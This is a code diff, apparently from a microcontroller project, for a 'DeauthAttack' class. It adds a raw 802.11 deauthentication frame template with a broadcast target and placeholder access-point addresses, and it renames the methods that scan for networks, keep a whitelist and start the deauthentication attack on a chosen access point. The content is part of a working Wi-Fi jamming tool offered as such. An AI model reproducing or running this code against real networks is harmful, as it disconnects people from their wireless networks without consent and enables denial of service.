@@ -4,11 +4,22 @@
 
 #include "deauth.h"
 
-void DeauthAttack::addToWhitelist(const char* bssid) {
+// deauth packet defined here
+uint8_t deauthPacket[26] = {
+    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
+    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
+    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
+    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
+    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
+    /* 22 - 23 */ 0x00, 0x00,                         // fragment & sequence number
+    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
+    };
+
+void DeauthAttack::addWhitelist(const char* bssid) {
     whitelist.push_back(bssid);
 }
 
-void DeauthAttack::selectRandomAP() {
+void DeauthAttack::selectAP() {
     int apCount = WiFi.scanNetworks();
 
     if (apCount > 0) {
@@ -28,7 +39,7 @@ void DeauthAttack::selectRandomAP() {
     }
 }
 
-void DeauthAttack::startRandomDeauth() {
+void DeauthAttack::startDeauth() {
     if (randomAP.length() > 0) {
         Serial.println("Starting deauthentication attack on the selected AP...");
         // define the attack
